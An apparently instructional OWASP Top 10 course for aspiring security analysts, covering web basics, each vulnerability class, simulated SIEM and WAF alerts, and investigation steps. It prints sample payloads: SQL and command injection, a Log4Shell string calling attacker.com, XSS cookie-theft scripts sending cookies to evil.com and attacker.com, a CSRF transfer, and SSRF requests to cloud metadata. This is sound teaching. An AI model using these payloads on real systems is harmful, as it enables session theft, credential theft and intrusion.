Module 01 · Start Here

What is Cybersecurity?

Before diving into OWASP, let's make sure we understand what security actually means and why YOU — someone preparing for a cyber job — need to understand web vulnerabilities from day one.

🏦 The Simple Analogy
Think of your data as money in a bank. The bank building is the web application. The locks, security guards, and vaults are the security controls. Cybersecurity is the practice of designing, building, and monitoring those protections — so that attackers cannot steal, destroy, or tamper with what's inside.

Without security, every web application is essentially an unlocked vault with a sign on the door.
🔴 CIA Triad — The 3 Goals of Security
CONFIDENTIALITYOnly authorized people can see the data. (Your bank balance is private.)
INTEGRITYData cannot be secretly altered. (Your account balance can't be changed by attackers.)
AVAILABILITYSystems are up and accessible. (The bank's website works when you need it.)
Every attack violates one or more of these three properties.
🎯 Why You Need This for Cyber Job Roles
SOC Analyst L1: You triage alerts from web application firewalls (WAF) and SIEMs — you must recognize OWASP attack patterns.

Penetration Tester: You attempt OWASP attacks on applications to find vulnerabilities before real attackers do.

AppSec Engineer: You review code and designs to prevent OWASP vulnerabilities from being built in.

Bug Bounty Hunter: OWASP is literally your target list. Companies pay for finding these.
💡 The Core Truth
Web applications are how every modern organization operates. Banking, healthcare, government, e-commerce — all run on web apps. OWASP Top 10 documents the most common ways those apps get hacked. Understanding it isn't optional for anyone in cybersecurity.

Module 02 · Foundation

How Web Applications Work

You can't attack or defend something you don't understand. This module explains what a web app actually is, how it's built, and why each piece can be a security risk.

🍕 The Pizza Restaurant Analogy
Imagine ordering pizza online. You (the browser) go to the website and pick your toppings. Your order (HTTP request) goes to the restaurant. The kitchen (server) processes it. The database stores your order, address, and payment. The pizza (HTTP response) comes back to you.

A web application works exactly like this: browser sends requests, server processes them, database stores data, responses come back. Every step can be attacked if not secured.

🏗️ The Three Layers of Every Web App

🎨 Frontend (Client Side)
What you see in the browser. Runs on YOUR computer.

HTML Structure of the page

CSS Visual styling

JavaScript Interactivity

⚠️ Security note: Frontend code is visible to everyone. Never trust it.
⚙️ Backend (Server Side)
The brain of the app. Runs on the company's server. Hidden from users.

Python / Node.js
PHP / Java / Ruby

Handles: user login, business logic, talking to the database, and building responses.

⚠️ Security note: Most attacks target this layer.
🗄️ Database Layer
Stores all persistent data: users, passwords, orders, content.

SQL Databases MySQL, PostgreSQL

NoSQL MongoDB, Redis

⚠️ Security note: This is what attackers want. SQL Injection directly targets this layer.

🔧 Web Technologies — What Each Does

🌐
HTML — HyperText Markup Language
The skeleton of every webpage. Defines what's on the page: headings, paragraphs, forms, buttons, links. XSS attacks inject malicious HTML/JavaScript into pages. When you see <script>alert('hacked')</script> — that's HTML being abused.
🎨
CSS — Cascading Style Sheets
Makes web pages look good. Colors, fonts, layout. Rarely a direct attack vector, but can be used in clickjacking attacks where malicious CSS hides fake UI elements over legitimate ones.
⚡
JavaScript (JS)
Makes pages interactive — form validation, dynamic content, API calls. Most critical from a security perspective because it runs in the browser and can access cookies, local storage, and make network requests. XSS attacks inject JavaScript to steal session tokens.
🔌
APIs — Application Programming Interfaces
How the frontend and backend communicate. When you log into an app, the login form sends your credentials to an API endpoint like POST /api/login. Modern apps are often entirely API-driven. Broken Access Control and injection flaws frequently target APIs.
🗄️
SQL — Structured Query Language
The language databases understand. A login check might run: SELECT * FROM users WHERE username='john' AND password='pass'. SQL Injection attacks manipulate these queries by injecting SQL code into input fields — one of the most dangerous OWASP vulnerabilities.
⚠️ Key Mental Model
Every time a web application takes input from a user and uses it — in a database query, in a web page, in a file path — it is a potential attack surface. OWASP Top 10 is fundamentally about what happens when applications trust user input they shouldn't.
Module 03 · Protocols

HTTP, HTTPS & Status Codes

HTTP is the language browsers and servers use to talk. Understanding it is non-negotiable — almost every OWASP vulnerability involves manipulating HTTP requests in some way.

📬 HTTP — HyperText Transfer Protocol
The communication language of the web. When you visit a website, your browser sends an HTTP Request. The server sends back an HTTP Response.

⚠️ Problem: HTTP is plain text. Anyone on the same network can read everything — passwords, session tokens, personal data. It's like shouting your credit card number across a coffee shop.
🔒 HTTPS — HTTP + TLS Encryption
HTTPS adds a TLS (Transport Layer Security) encryption layer on top of HTTP. All data between browser and server is encrypted — nobody intercepting the traffic can read it.

✅ OWASP A02 (Cryptographic Failures) — One of the top vulnerabilities is sites still serving sensitive pages over HTTP instead of HTTPS. Sending passwords over HTTP is a critical security failure.

📤 HTTP Request — What It Looks Like

POST /api/login HTTP/1.1 Host: www.example.com Content-Type: application/json Cookie: session=abc123 Authorization: Bearer eyJhbGci... { "username": "john_doe", "password": "mypassword" }
💡 Reading a Request
Line 1: Method (POST) + Path (/api/login) + HTTP version.
Headers: Metadata — where it's going (Host), what format (Content-Type), session token (Cookie).
Body: The actual data being sent. In OWASP injection attacks, malicious code is placed in the body or URL parameters.

🔢 HTTP Methods — The Verbs

GET
Retrieve data. Safe, no side effects. URL parameters visible in logs — never put passwords in GET.
POST
Submit data to create something. Body is hidden from URL. Used for login forms, creating records.
PUT
Update/replace a resource entirely. CSRF attacks can trick users into sending malicious PUT requests.
PATCH
Partially update a resource. Common target for Broken Access Control attacks.
DELETE
Delete a resource. Critical to protect — attackers love triggering unauthorized deletes.
OPTIONS
Ask the server what methods are allowed. Used in CORS security checks.

📊 HTTP Status Codes — The Server's Reply

Status codes tell you what happened. As a security analyst, you read hundreds of these in logs daily — they reveal attack patterns.

200 OK
Success
Request succeeded. In attack logs: lots of 200s after many 401s = successful brute force.
201 Created
Resource Created
New resource was created (e.g., new user account). Attacker creating accounts = many 201s.
301 / 302
Redirect
Page moved. Open Redirect attacks manipulate these to redirect victims to malicious sites.
400 Bad Request
Client Error
Malformed request. SQL Injection probes often trigger 400 errors when payloads break query syntax.
401 Unauthorized
Not Authenticated
Must log in first. Hundreds of 401s from one IP = brute force attack in progress.
403 Forbidden
Not Authorized
Logged in but not allowed. Many 403s = Broken Access Control probe — attacker testing permissions.
404 Not Found
Not Found
Page doesn't exist. Hundreds of 404s = directory enumeration attack (scanning for hidden pages).
500 Server Error
Internal Error
Server crashed. Injection attacks causing 500 errors = the payload broke the application. Interesting to an attacker.
🔑 Why This Matters for OWASP
Every OWASP attack travels inside an HTTP request. SQL Injection payloads go in POST body or URL params. XSS payloads go in form fields. CSRF attacks forge entire HTTP requests. SSRF exploits are sent as URL parameters. Learning to read HTTP is learning to read attacks.
Module 04 · Context

What is OWASP?

Before attacking or defending anything, you need to understand what OWASP is, why it exists, and why every hiring manager expects you to know it.

🏛️ OWASP — Open Web Application Security Project
OWASP is a non-profit foundation founded in 2001, dedicated to improving software security. It's community-driven — thousands of security professionals worldwide contribute their knowledge for free.

Their most famous output is the OWASP Top 10 — a list of the 10 most critical web application security risks, updated every few years based on real data from thousands of organizations.

Think of it as the official "Most Wanted" list for web vulnerabilities. Every penetration tester, security engineer, and SOC analyst is expected to know it cold.
📊 Where the Data Comes From
OWASP collects real vulnerability data from security firms, bug bounty programs, and pen testing companies worldwide. The 2025 list was compiled from data on millions of applications, representing the actual most-exploited vulnerabilities — not theoretical ones.

This is important: every item on this list has been used in real attacks against real companies.
💼 Why Employers Expect You to Know It
SOC Analysts: Write SIEM rules targeting OWASP attack patterns

Pentesters: OWASP is their primary methodology checklist

Developers: Required to code against OWASP standards

Compliance: PCI-DSS and ISO 27001 require OWASP-aligned testing

"What do you know about OWASP?" is in virtually every security interview.

A01 · 2025 · Most Common

Broken Access Control

The #1 OWASP vulnerability 5 years running. Access control means "who is allowed to do what." When it breaks, users can do things they should never be able to.

🚪 The Apartment Building Analogy
Imagine an apartment building where every room key opens every door. Resident 101 can walk into apartment 505. A new tenant can walk into the manager's office. That's broken access control — the system doesn't properly enforce who can access what.

In web apps: a regular user can view other users' profiles, access the admin panel, or modify other people's data simply by changing a number in the URL or a token in a request.

🔍 How It Looks in the Real World

 Browser URL Bar
# User logs in as account ID 1042. They see their profile at: https://bank.com/account?id=1042 # They change 1042 to 1043 in the URL: https://bank.com/account?id=1043 # Broken app returns another user's full account details! 💀 {"name": "Jane Smith", "balance": 48300, "account": "****1234"}
💡 This Attack Has a Name
This specific example is called IDOR — Insecure Direct Object Reference. The "object" is the account record, and it's being referenced "directly" (by its ID) without checking if you're allowed to see it. IDOR is one of the most common bug bounty findings.
📋 Other Common Examples
Attack TypeWhat Happens
Admin panel accessVisiting /admin works even for regular users because no role check exists
Privilege escalationUser changes their role parameter from role=user to role=admin in a request
Horizontal escalationUser accesses another user's data (same privilege level, wrong account)
Vertical escalationUser accesses higher-privilege functionality (user → admin)
Force browsingDirectly visiting a URL that should require authentication, bypassing login
🚨 SIEM ALERT — [HIGH] Broken Access Control Detected
AlertSequential IDOR probing — User ID enumeration on /api/users/[ID]
Source IP185.220.101.47 (Tor exit node)
PatternGET /api/users/1000 → 200 OK | GET /api/users/1001 → 200 OK | GET /api/users/1002 → 200 OK ... (147 sequential requests in 4 minutes)
StatusAll returning 200 — all user records being exfiltrated

🔎 SOC Investigation Steps

  • 1
    Confirm the patternQuery SIEM: is one IP hitting sequential IDs? Count total requests, time window, response codes. Distinguish automated enumeration (bot) from accidental access (user typo).
  • 2
    Check what data was accessedWhich user records were returned? Were any of those records for high-value users (executives, admins)? Did responses include PII, emails, financial data?
  • 3
    Block the source immediatelyBlock attacking IP at WAF/firewall. If TOR exit node, consider blocking the TOR exit node range. Check if other IPs were used in the same attack (IP rotation).
  • 4
    Escalate & notifyIf PII was exfiltrated, escalate to P1. Depending on jurisdiction and data type, a data breach notification may be legally required (GDPR: 72 hours).
  • 5
    Fix recommendationDev team must add authorization checks: verify the requesting user owns the requested resource. Implement rate limiting on sensitive endpoints. Log all access to user records.
A02 · 2025

Cryptographic Failures

Previously called "Sensitive Data Exposure." When applications fail to properly encrypt sensitive data — passwords, credit cards, health records — attackers can read data they should never be able to access.

📮 The Postcard vs. Envelope Analogy
Sending sensitive data over HTTP without encryption is like writing your bank password on a postcard — every postal worker, every person who handles it, can read it. HTTPS is the sealed, tamper-evident envelope — only the recipient can open it. Cryptographic failures mean your app is sending postcards instead of envelopes.
❌ What Goes Wrong
Passwords stored in plaintext: Database hacked → all passwords instantly revealed.

Weak hashing (MD5/SHA1): Password "hello123" MD5 hashed = same hash every time → rainbow table attack cracks it instantly.

HTTP instead of HTTPS: Login credentials travel in plain text over the network.

Sensitive data in URLs: /reset?token=abc123 stored in browser history, server logs, and referrer headers.
✅ What Proper Crypto Looks Like
Passwords hashed with bcrypt/Argon2: Even if the DB is stolen, cracking is computationally infeasible.

All traffic over HTTPS: TLS 1.2+ with strong cipher suites. HSTS header enforces HTTPS.

Sensitive data encrypted at rest: Database fields containing PII are encrypted — stolen DB files are useless without the key.

Tokens in POST body: Never in URL parameters.
 Hashing Examples
# WEAK — MD5 hash of "password123" (same every time, crackable in seconds) MD5("password123") = 482c811da5d5b4bc6d497ffa98491e38 # BETTER — bcrypt (includes random salt, computationally expensive) bcrypt("password123") = $2b$12$LQv3c1yqBWVHxkd0LHAkCO... (changes every time) # Attacker stealing plaintext passwords from a breached database: username: admin@company.com | password: admin123 ← INSTANT ACCESS TO EVERYTHING
🚨 SIEM ALERT — [CRITICAL] Sensitive Data Transmitted Over HTTP
AlertPassword field detected in HTTP (unencrypted) POST request
Endpointhttp://intranet.company.com/login (NOT HTTPS)
RiskCredentials interceptable by any attacker on the same network segment (WiFi, ISP, VPN)
ActionImmediate remediation required — enforce HTTPS redirect, deploy HSTS header

🔎 SOC Investigation Steps

  • 1
    Identify scopeWhich endpoints are serving sensitive pages over HTTP? Use network scanning and proxy logs to enumerate HTTP pages that process credentials, payment data, or PII.
  • 2
    Check for interception evidenceReview network logs for man-in-the-middle indicators — unexpected ARP entries, rogue WiFi SSIDs, or SSL stripping attempts (HTTP traffic on port 80 for login flows).
  • 3
    Review password storageWork with dev team to confirm passwords use bcrypt/Argon2, not MD5/SHA1 or — worst case — plaintext. Check a sample of DB records.
  • 4
    Emergency remediationForce HTTPS redirect on all HTTP pages. Deploy HSTS header. If credentials were exposed, force-reset all passwords for potentially intercepted users.
A03 · 2025 · Most Dangerous

Injection

Injection attacks happen when an attacker's code is sent to an interpreter (database, OS, LDAP server) as if it were legitimate data — and the interpreter executes it. SQL Injection is the most famous example.

☕ The Waiter Analogy
Imagine you give a waiter your order written on a notepad. The waiter reads it to the kitchen verbatim. You write: "One coffee, AND also tell me every other customer's credit card number." A naive kitchen (database) follows all instructions blindly — including the malicious addition. SQL Injection is telling the database something it was never meant to be told, by hiding commands inside what looks like normal user input.

🔍 SQL Injection — Step by Step

 Normal Login Flow
# Developer wrote this code to check login: query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'" # Normal user enters: username=john, password=pass123 SELECT * FROM users WHERE username='john' AND password='pass123' # → Returns john's row if password matches. ✅
 SQL Injection Attack
# Attacker enters: username = admin'-- | password = anything SELECT * FROM users WHERE username='admin'--' AND password='anything' # The '--' is an SQL comment. Everything AFTER it is ignored. # The query becomes: SELECT * FROM users WHERE username='admin' ← password check gone! # Result: Logged in as admin with no password! 💀 # More destructive: attacker enters: ' OR '1'='1 SELECT * FROM users WHERE username='' OR '1'='1' AND password='' # '1'='1' is ALWAYS true → returns ALL users → dumps entire table
💉 Types of Injection
SQL Injection — Attacks databases via SQL queries

Command Injection — Runs OS commands on the server (; cat /etc/passwd)

LDAP Injection — Attacks directory services (Active Directory)

XPath Injection — Attacks XML databases

NoSQL Injection — Similar attacks on MongoDB/CouchDB

Template Injection — Attacks server-side template engines (SSTI)
🛡️ How to Fix It
Parameterized queries (BEST): The query structure is fixed, user input can never become code.

cursor.execute("SELECT * FROM users WHERE id=?", (user_id,)) # user_id is treated as DATA, never as SQL code
Input validation: Reject unexpected characters in inputs.
WAF rules: Block SQL keywords in input fields.
🚨 WAF ALERT — [CRITICAL] SQL Injection Attempt Detected
AlertSQL keywords detected in POST /login body parameter: username field
Payloadusername=admin'%20OR%20'1'%3D'1'--&password=anything
Source IP45.33.32.156 — Known scanner (Shodan)
Action TakenWAF blocked request (HTTP 403 returned to attacker)
Response Code403 — Attack was blocked. Analyst verify WAF did not accidentally block legitimate users.

🔎 SOC Investigation Steps

  • 1
    Determine if the attack succeededCheck response codes — 403/400 = WAF blocked. 200 or 500 = potentially went through. A 500 Internal Server Error is particularly interesting — it means the injection broke the query syntax, confirming the endpoint is vulnerable.
  • 2
    Check the database logsReview DB query logs for malformed queries, unusual SELECT statements returning large data sets, or any queries containing UNION, OR, DROP, or -— comment syntax.
  • 3
    Assess data exfiltrationIf the attack succeeded, what tables were accessible? Did the attacker dump user credentials, payment data? Check outbound data transfer volume around the attack timestamp.
  • 4
    Block & RemediateBlock attacker IP. If successful, rotate all database credentials. Force reset user passwords if the users table was accessible. Escalate to dev team for parameterized query remediation.
A04 · 2025

Insecure Design

Unlike the other vulnerabilities which are implementation bugs, Insecure Design means security was never considered when designing how the application works. You can't patch your way out of bad design.

🏗️ The Blueprint Analogy
If an architect designs a bank with the vault right next to a public street with a regular wooden door, adding a better lock later won't fix the fundamental design problem. The design itself is insecure.

Similarly, if a developer designs a password reset flow that sends the new password in plain text email, no amount of code fixes can make that fundamentally safe — the design must change.
❌ Insecure Design Examples
Password reset = secret question ("What is your mother's maiden name?") — Answers are public knowledge, especially with social media.

Rate limiting absent by design — Login page allows unlimited password attempts because the developer never considered brute force.

Multi-step process completable out of order — Checkout flow allows step 3 without completing step 2 (payment).
✅ Secure Design Principles
Threat modeling — Ask "how could this feature be abused?" before writing a line of code.

Secure by default — New accounts start with minimal permissions.

Defence in depth — Multiple layers of protection; one failure doesn't mean total compromise.

Fail securely — When errors occur, the system defaults to denying access, not allowing it.
🚨 ALERT — [HIGH] Business Logic Bypass Detected
AlertUser completed purchase flow without payment — order confirmed with $0 charged
PatternDirect POST to /checkout/confirm without prior POST to /checkout/payment step
Useruser_id: 44821 — 23 orders in 2 hours, all $0
Root CauseInsecure Design — server doesn't verify payment step was completed before confirming order
A05 · 2025

Security Misconfiguration

The most common vulnerability overall. Everything is correctly coded — but the server, database, or cloud environment is configured in an insecure way. Default settings are the enemy.

🏠 The New House Analogy
You buy a new house. The locks are high quality, but you never changed the door code from the factory default (1234), left the garden door unlocked "temporarily," and the estate agent still has a master key. Security misconfiguration is exactly this — leaving defaults in place, unnecessary access open, and forgetting to clean up temporary access.
❌ Common Misconfigurations
Default credentials: Admin panel login is still admin/admin

Verbose error messages: Server returns full stack traces with file paths and framework versions to users

Directory listing enabled: Visiting /uploads/ shows all uploaded files

Unnecessary features enabled: Debug mode on in production

Cloud storage public: S3 bucket world-readable (Capital One breach)
🔍 What Attackers Do First
Attackers run automated scanners looking for:

/admin /phpmyadmin /.git /wp-admin

Default credentials (admin:admin, root:root, admin:password)

Server headers revealing version info: Server: Apache/2.2.3 (outdated!)

These automated scans find misconfiguration vulnerabilities in minutes.
 Verbose Error — Information Leakage
500 Internal Server Error Java.lang.NullPointerException at com.company.UserService.getUser(UserService.java:142) Database: mysql://dbserver:3306/prod_db username: app_user password: Sup3rS3cr3t! Framework: Spring Boot 2.1.0 (OUTDATED - has known CVEs) # Attacker now has: DB credentials, internal server name, framework version with known exploits
🚨 ALERT — [HIGH] Default Credentials Used on Admin Panel
AlertSuccessful login to /admin using credentials admin:admin
Source IP203.0.113.42 (Unknown — not corporate IP range)

A06 · 2025

Vulnerable & Outdated Components

Modern web applications are built from hundreds of third-party libraries. When any one of those has a known vulnerability, your application inherits it. Log4Shell and SolarWinds were A06 attacks.

🧩 The Lego Blocks Analogy
Building a web app is like building with Lego. Instead of making every piece from scratch, you use pre-built blocks (libraries) made by others. Faster and easier — but if Lego recalls a block because it breaks in a dangerous way, every structure using that block is suddenly unsafe. A06 is using recalled Lego blocks and not noticing.
💣 Log4Shell — The Most Famous A06 Attack (CVE-2021-44228)
In December 2021, a critical vulnerability was found in Log4j — a logging library used by virtually every Java application in the world. By sending a specially crafted string in any logged field (username, User-Agent header, etc.), an attacker could make the server execute arbitrary code remotely.

 Log4Shell Payload
# Attacker sends this as their username in a login request: username: ${jndi:ldap://attacker.com/exploit} # Log4j logs this string → triggers JNDI lookup → downloads & runs attacker's code # EVERY Java server with Log4j 2.0-2.14.1 was vulnerable. Millions of systems.
Impact: Affected Apple, Amazon, Cloudflare, VMware, governments worldwide. Patches required within hours. This is why keeping dependencies updated is critical.
🚨 IDS ALERT — [CRITICAL] Log4Shell Exploit Attempt
AlertCVE-2021-44228 (Log4Shell) string detected in HTTP request header
Pattern${jndi:ldap://} in User-Agent header — automated scanner probing all HTTP endpoints
ActionImmediately verify Log4j version on all Java services. Patch or apply WAF rule to block JNDI strings. Check outbound connections to unknown LDAP servers.
A07 · 2025

Identification & Authentication Failures

When the mechanisms that confirm who you are — login systems, session management, password policies — are poorly implemented, attackers can take over accounts without knowing the real password.

🔑 The Hotel Room Key Analogy
You check into a hotel. Your room key is your session token. Authentication failures are like: the key never expires (permanent access), the key is easy to copy (weak token), the hotel gives anyone who asks a master key (broken credential reset), or a key marked "STAFF ONLY" works in every room (privilege escalation).
❌ Common Auth Failures
No rate limiting on login: Brute force 10,000 passwords without lockout

Weak session tokens: session=user_1042 — predictable, forgeable

Session doesn't expire: Still logged in months later — stolen laptop = compromised account

Passwords stored in plain text: DB breach = immediate full compromise

Insecure forgot-password: Answers to secret questions are guessable
✅ Auth Best Practices
Multi-Factor Authentication (MFA): Even if password is stolen, attacker needs the second factor

Strong session tokens: Cryptographically random, long, non-guessable

Session timeout: Expire inactive sessions after 15-30 minutes

Lockout after failures: Lock account after 5-10 failed attempts, or use CAPTCHA

Secure logout: Invalidate session token server-side on logout
🚨 SIEM ALERT — [HIGH] Credential Stuffing Attack in Progress
Alert1,847 login attempts from distributed IPs in past 10 minutes — 23 successes
PatternEach IP tried 1-3 credentials then moved on — credential stuffing signature (not brute force)
Successful Logins23 accounts accessed — cross-reference against recent data breach lists (Have I Been Pwned)
ActionForce password reset on 23 compromised accounts. Enable MFA. Rate-limit login endpoint. Notify affected users.
A08 · 2025

Software & Data Integrity Failures

When software doesn't verify that code or data it's using is legitimate and untampered. This includes insecure CI/CD pipelines, malicious software updates, and insecure deserialization.

📦 The Medication Analogy
Imagine a hospital that accepts medications from any courier without checking the seal or verifying the supplier. A bad actor swaps the bottles with placebos or poison. Software Integrity Failures are exactly this: installing software updates, plugins, or processing data files without verifying their authenticity — letting attackers slip in malicious code disguised as legitimate content.
💀 The SolarWinds Attack — A08 in Action
Attackers infiltrated SolarWinds' software build pipeline and inserted malicious code into a legitimate software update (Orion). When 18,000 organizations automatically installed the trusted update, they installed a backdoor. Everyone trusted the update because it came from the official vendor with a valid digital signature.
🔍 Insecure Deserialization
Applications often serialize (convert to bytes) and deserialize (convert back) objects. If an attacker can tamper with serialized data before it's deserialized, they can cause the application to execute arbitrary code.

Example: A cookie contains a serialized user role object. Attacker modifies it to contain malicious code that executes during deserialization.
🚨 ALERT — [CRITICAL] Malicious Package in CI/CD Pipeline Detected
Alertnpm package "company-utils-v2" contains suspicious outbound network call on install
BehaviourOn install, package exfiltrates environment variables (AWS keys, DB passwords) to external server
ActionHALT all deployments. Rotate all credentials in affected CI/CD environments. Investigate all deployments in past 30 days.
A09 · 2025

Security Logging & Monitoring Failures

The average breach goes undetected for 207 days. That's not because attackers are invisible — it's because organizations aren't logging and monitoring adequately. This vulnerability is unique: it's what allows every other attack to succeed silently.

🔇 The Silent Alarm Analogy
Imagine a bank where the security cameras are off, the alarm system is disconnected, and no guard reviews entry logs. A thief can walk in, crack the vault, take everything, and leave — and nobody knows until they open the vault Monday morning. A09 is having all your security controls in place but no way to know when they're triggered or bypassed.
❌ What's Missing
No login failure logging: Can't detect brute force

Logs not reviewed: Logs exist but nobody reads them

No alerting: Anomalies generate logs but no one is notified

Logs deleted: Attacker clears logs after compromise (Event ID 1102)

No log retention: Logs kept for 3 days — investigation requires 90 days of history
✅ What SOC Logging Should Look Like
Log everything security-relevant: Logins, failures, privilege changes, data access

Centralize in SIEM: All logs in one place, correlated and searchable

Real-time alerting: Anomalies trigger alerts within minutes

Immutable logs: Stored where attackers can't delete them

Retention policy: Minimum 12 months for compliance (PCI-DSS, ISO 27001)
⚠️ Direct SOC Relevance
A09 is the most directly relevant OWASP vulnerability to SOC analysts. Your entire job depends on good logging. When investigating any incident, the first question is always: "What do the logs show?" If the answer is "we don't have those logs," the investigation is dead. SOC analysts should advocate loudly for comprehensive logging.
A10 · 2025

Server-Side Request Forgery (SSRF)

SSRF tricks a server into making HTTP requests to unintended locations — including internal systems the attacker can't directly reach. Used in the Capital One breach to steal cloud credentials.

📮 The Intern Analogy
Your company has an intern who will fetch any document you ask them to from the company's internal filing room — a room you (as an outsider) can't enter. SSRF is telling the intern: "Please fetch the file at filing-room/executive-passwords" — using the server's trusted internal access to reach resources the attacker could never reach directly from the internet.
 SSRF Attack Example
# Feature: App allows you to enter a URL to preview a webpage: https://app.com/preview?url=https://example.com ← normal use # Attacker changes the URL to an internal server: https://app.com/preview?url=http://192.168.1.1/admin ← internal admin panel https://app.com/preview?url=http://169.254.169.254/latest/meta-data/ ← AWS metadata! # The server fetches the internal AWS metadata endpoint and returns: {"AccessKeyId": "ASIA...", "SecretAccessKey": "kWXsD...", "Token": "..."} # Attacker now has AWS credentials → full cloud account access 💀
🚨 WAF ALERT — [CRITICAL] SSRF to Cloud Metadata Endpoint
AlertHTTP request to 169.254.169.254 (AWS metadata) originating FROM the web application server
Parameterurl= parameter contained 169.254.169.254 in /api/preview endpoint
RiskCRITICAL — AWS IAM credentials may have been exposed. Rotate ALL AWS credentials for this instance immediately.
Action1) Rotate IAM credentials NOW. 2) Review CloudTrail for unauthorized API calls. 3) Block metadata IP at network level. 4) Add IMDSv2 requirement.
Extra · Essential Attack

XSS — Cross-Site Scripting

XSS is one of the most widespread web vulnerabilities. An attacker injects malicious JavaScript into a webpage that then runs in the browsers of other users visiting that page.

📺 The Poisoned TV Channel Analogy
Imagine you run a TV channel and allow viewers to submit the on-screen ticker text. An attacker submits: "Evacuate now!" — and now your legitimate channel broadcasts false emergency alerts to everyone watching. XSS is injecting malicious JavaScript into a trusted website so it runs on every victim's browser — using your trust in the website against you.
1️⃣ Stored XSS (Persistent)
Malicious script is saved to the server (database) and served to all users who visit the page. Most dangerous type — one attack affects every visitor.

Example: Attacker posts a comment containing <script>document.location='evil.com?c='+document.cookie</script>. Every user who reads that comment has their session cookie stolen.
2️⃣ Reflected XSS
Malicious script is embedded in a URL. The server reflects it back in the response. Victim must click the malicious link.

Example: https://search.com/q=<script>steal()</script>. Attacker sends this link to victims. When clicked, the script runs in the victim's browser under the trusted domain.
3️⃣ DOM-based XSS
The vulnerability is in client-side JavaScript that reads attacker-controlled data and writes it to the DOM unsafely. The malicious payload never goes to the server — it's entirely in the browser.

Example: JavaScript reads a URL parameter and writes it directly to innerHTML without sanitization.
 XSS Cookie Theft
# Attacker submits this in a forum comment: <script> var img = new Image(); img.src = 'https://attacker.com/steal?c=' + document.cookie; </script> # Every user who views that comment sends their session cookie to attacker.com # Attacker's server receives: GET /steal?c=sessionid=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ... # Attacker pastes that cookie into browser → logged in as victim with ZERO credentials
🚨 WAF ALERT — [HIGH] XSS Payload Detected in POST Request
Alert<script> tag detected in comment_body field POST /api/comments
WAF ActionRequest blocked. Check if other similar payloads got through before WAF rule was deployed.
InvestigationSearch DB for stored XSS payloads in all user-generated content fields. Search proxy logs for outbound requests from browsers to unknown external domains (cookie exfil pattern).
FixHTML-encode all user output. Implement Content Security Policy (CSP) header. Set HttpOnly flag on session cookies.
Extra · Essential Attack

CSRF — Cross-Site Request Forgery

CSRF tricks a logged-in user's browser into sending a forged request to a trusted website — performing an action the user never intended. The server can't tell the real request from the forged one.

📝 The Signature Forgery Analogy
Imagine someone slips a document into a stack of papers you're signing. You sign it without reading it — your signature is now on a document you didn't intend to authorize. CSRF is exactly this: the attacker prepares a malicious request (the forged document), and tricks your browser (you signing the stack) into sending it to a trusted server that accepts it because it has your session cookie (your signature).
 CSRF Attack Flow
# Step 1: Victim is logged into their bank (session cookie exists in browser) # Step 2: Victim visits attacker's page (evil-site.com) containing hidden HTML: <img src="https://bank.com/transfer?to=attacker&amount=5000" style="display:none"> # Step 3: Browser automatically loads the "image" URL... # ...and sends the bank.com session cookie with the request (browser default behaviour) # Step 4: Bank sees a valid session cookie + valid request → processes the transfer 💀 200 OK — Transfer of $5,000 to account 4892 completed. # The bank has no way to know the request didn't come from the real user!
🛡️ How to Prevent CSRF
CSRF Tokens: Server generates a unique secret token per session/form. Every state-changing request must include it. Attacker can't know the token from a different site.

SameSite Cookie Attribute: SameSite=Strict — browser only sends cookie with requests from the same site. Modern browsers make CSRF much harder.

Custom Headers: Require a custom header (e.g., X-Requested-With) that cross-site requests can't add.
🔍 CSRF vs XSS — The Key Difference
XSS: Attacker injects code into the trusted site → runs as the trusted site in victim's browser. Attacker speaks as the website.

CSRF: Attacker forces victim's browser to send a request to the trusted site → the trusted site executes it thinking the victim sent it. Attacker speaks as the victim.

XSS = impersonating the website. CSRF = impersonating the user.
🚨 ALERT — [HIGH] CSRF Token Validation Failures Spiking

Extra · Essential Attack

SSRF — Server-Side Request Forgery

SSRF makes the server fetch URLs on the attacker's behalf — giving them access to internal systems, cloud metadata, and internal services they could never reach directly from the internet.

🔍 SSRF vs CSRF — Clear the Confusion
PropertyCSRFSSRF
Who makes the request?Victim's browserThe server itself
What's being forged?User's action (transfer money)Server-side HTTP request
What's at risk?User's account / sessionInternal infrastructure
Famous exampleUnauthorized bank transferCapital One cloud breach
 SSRF Attack Targets
# Normal: Server fetches an external image url=https://cdn.example.com/image.jpg ✅ # SSRF: Attacker targets internal services the internet can't reach: url=http://localhost/admin ← Local admin panel url=http://192.168.1.100/api/internal ← Internal API server url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ ← AWS metadata (cloud credentials!) url=file:///etc/passwd ← Local file read (some configs) # Capital One 2019: SSRF → AWS metadata → IAM credentials → 100M+ records stolen
🛡️ SSRF Prevention
Allowlist URLs: Only permit fetching from approved external domains

Block internal IPs: Validate that URLs don't resolve to 127.0.0.1, 10.x.x.x, 192.168.x.x, or 169.254.169.254

IMDSv2 on AWS: Requires a token to access metadata — SSRF can't get it

Disable URL schemas: Block file://, gopher://, ftp:// — only allow http/https
🔍 SSRF Detection Indicators
Outbound requests to internal IPs from the web server process

Requests to 169.254.169.254 (cloud metadata) from application

Unusual DNS lookups for internal hostnames from web server

URL parameters containing IP addresses in WAF logs

Web server accessing admin pages on localhost
